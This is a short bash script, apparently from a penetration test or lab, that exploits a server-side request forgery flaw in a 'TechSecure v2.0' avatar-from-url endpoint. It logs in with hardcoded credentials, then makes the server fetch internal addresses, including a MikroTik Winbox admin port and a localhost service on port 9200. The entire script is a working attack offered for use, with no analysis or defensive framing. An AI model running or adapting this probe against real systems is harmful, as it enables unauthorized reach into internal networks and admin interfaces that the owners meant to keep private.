#!/usr/bin/env bash
# SSRF probing against the TechSecure v2.0 avatar-from-url feature.
# Uses the vulnerable server as a proxy to reach internal-only
# resources that would not otherwise be reachable directly.
#
# Usage: ./ssrf_probe.sh

set -euo pipefail

TARGET_HOST="10.216.27.100:8080"
USERNAME="budi.santoso"
PASSWORD="Budi12345"
COOKIE_JAR="/tmp/techsecure_cookies.txt"

# Internal targets to probe via SSRF
TARGETS=(
  "http://10.216.27.1:8291/"     # MikroTik Winbox admin port
  "http://127.0.0.1:9200/"        # Local service on the vulnerable host itself
)

echo "[*] Authenticating as ${USERNAME}..."
curl -s -c "${COOKIE_JAR}" -X POST "http://${TARGET_HOST}/index.php" \
  -d "user=${USERNAME}&pass=${PASSWORD}" -o /dev/null

for url in "${TARGETS[@]}"; do
  echo "--- Probing ${url} via SSRF ---"
  curl -s -b "${COOKIE_JAR}" -X POST "http://${TARGET_HOST}/profile/avatar-from-url.php" \
    --data-urlencode "avatar_url=${url}"
  echo
  sleep 1
done
